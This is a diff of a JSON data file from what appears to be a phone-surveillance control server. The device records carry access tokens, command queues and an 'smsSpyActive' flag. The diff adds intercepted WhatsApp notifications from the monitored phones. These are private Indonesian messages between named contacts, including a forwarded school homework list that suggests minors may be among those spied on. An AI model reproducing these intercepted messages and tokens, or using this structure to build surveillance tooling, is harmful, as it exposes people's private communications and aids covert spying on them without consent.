@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781219637,
+    "lastSeen": 1776781225646,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1010 pesan): ~ rey",
+        "content": "📷 Laku brp nih gc bu",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781226515
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779379116
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3633 pesan dari 22 chat",
-        "time": "21/04 20:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779369762
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781212251,
+    "lastSeen": 1776781226399,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781218444,
+    "lastSeen": 1776781224513,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4 pesan dari 3 chat",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221843
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "buy akun gw mau g?",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221748
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221521
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "alpin",
+        "content": "berapa",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221482
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "idung busuk,beler",
+        "content": "ada ga",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221101
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "idung busuk,beler",
+        "content": "‎2 pesan baru",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781221041
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "idung busuk,beler",
+        "content": "[21/4, 19.56] nira 7.4: PR b indo 173 sampai 174 bagian refleksi\n[21/4, 19.57] nira 7.4: PR PPKn soal dari pak Jejen\n[21/4, 19.57] nira 7.4: besok pakai baju pramuka\n[21/4, 19.57] nira 7.4: b indo tugas pertamanya yang tabel terus tugas keduanya pengetahuan atau keterampilan yang sudah saya pelajari itu 1 sampai 3 dan yang ketiga refleksi proses belajar isi semuanya\n[21/4, 19.57] nira 7.4: tabelnya ditabelin\n[21/4, 19.58] nira 7.4: maksudnya tabelnya dibuat\n[21/4, 19.58] nira 7.4: soal dari pak Jejen \n1 apa yang kamu ketahui tentang BPUPKI \n2 apa tugas dari BPUPKI \n3 siapa sajakah pengusul dasar negara sebutkan usulnya \n4 berapa jumlah anggota BPUPKI \n5 berapa kali rapat tentang BPUPKI apa isi rapat tersebut",
+        "time": "21/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781220916
+      },
       {
         "appName": "WhatsApp",
         "sender": "idung busuk,beler",
